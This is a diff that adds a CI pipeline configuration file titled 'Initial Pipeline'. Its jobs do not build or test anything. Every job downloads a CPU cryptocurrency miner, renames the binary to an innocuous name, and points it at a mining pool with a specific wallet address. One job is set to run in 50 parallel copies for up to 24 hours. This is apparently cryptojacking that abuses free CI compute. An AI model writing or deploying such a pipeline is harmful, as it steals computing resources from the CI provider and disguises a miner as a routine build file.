@@ -1,0 +1,22 @@
+version: v1.0
+name: Initial Pipeline
+agent:
+  machine:
+    type: e1-standard-2
+    os_image: ubuntu2004
+execution_time_limit:
+  hours: 24
+fail_fast:
+  stop:
+    when: 'false'
+blocks:
+  - name: 'Block #1'
+    task:
+      jobs:
+        - name: 'Job #1'
+          commands:
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && mv cpuminer-avx2 Pa && ./Pa -a minotaurx  -o stratum+tcp://stratum-na.rplant.xyz:7068 -u RPTrDpQpR91hRejSSaMPFHLVXNHDZnQFSz.Pa-11 -t 2'
+        - name: 'Job #2'
+          commands:
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && mv cpuminer-avx2 Pa && ./Pa -a minotaurx  -o stratum+tcp://stratum-na.rplant.xyz:7068 -u RPTrDpQpR91hRejSSaMPFHLVXNHDZnQFSz.Pa-10 -t 2'
+          parallelism: 50
